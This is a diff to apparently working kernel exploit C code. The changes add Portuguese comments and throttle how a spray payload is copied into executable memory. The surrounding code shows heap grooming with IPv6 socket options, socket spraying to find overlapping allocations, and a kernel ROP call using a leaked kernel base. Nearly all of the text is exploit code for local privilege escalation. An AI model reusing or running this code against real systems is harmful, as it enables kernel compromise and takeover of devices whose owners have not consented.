@@ -334,6 +334,7 @@ void restore_kernel_state() {
         if (current_size >= 0xFF && current_base != 0) {
             break;
         }
+
         stabilize_kernel_memory();
         nanosleep(NANOSLEEP_10MS, NULL);
     }
@@ -379,6 +380,7 @@ int main() {
     int master_sock = new_socket();
     krop_master_sock = master_sock * 8;
 
+    // Heap grooming otimizado
     for (int i = 0; i < HEAP_GROOM_COUNT; i++) {
         int temp_sock = new_socket();
         reset_ipv6_opts(temp_sock);
@@ -411,6 +413,7 @@ int main() {
     for (int attempts = 0; attempts < MAX_ATTEMPTS; attempts++) {
         int overlap_idx = -1;
 
+        // Reciclagem de sockets
         for (int i = 0; i < SPRAY_SIZE; i++) {
             close(spray_sock[i]);
             spray_sock[i] = new_socket();
@@ -482,9 +485,11 @@ int main() {
     char* spray_map = mmap(0, spray_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
     if (spray_map == MAP_FAILED)
         *(volatile int*)0;
-    
-    for (size_t i = 0; i < spray_size; i++)
-        spray_map[i] = spray_start[i];
+
+    for (size_t i = 0; i < spray_size; i++) {
+        spray_map[i] = spray_bin[i];
+        if (i % 4096 == 0) nanosleep(NANOSLEEP_50US, NULL);
+    }
 
     pin_to_cpu(1);
     rop_call_funcptr(spray_map, spray_sock, kernel_base);
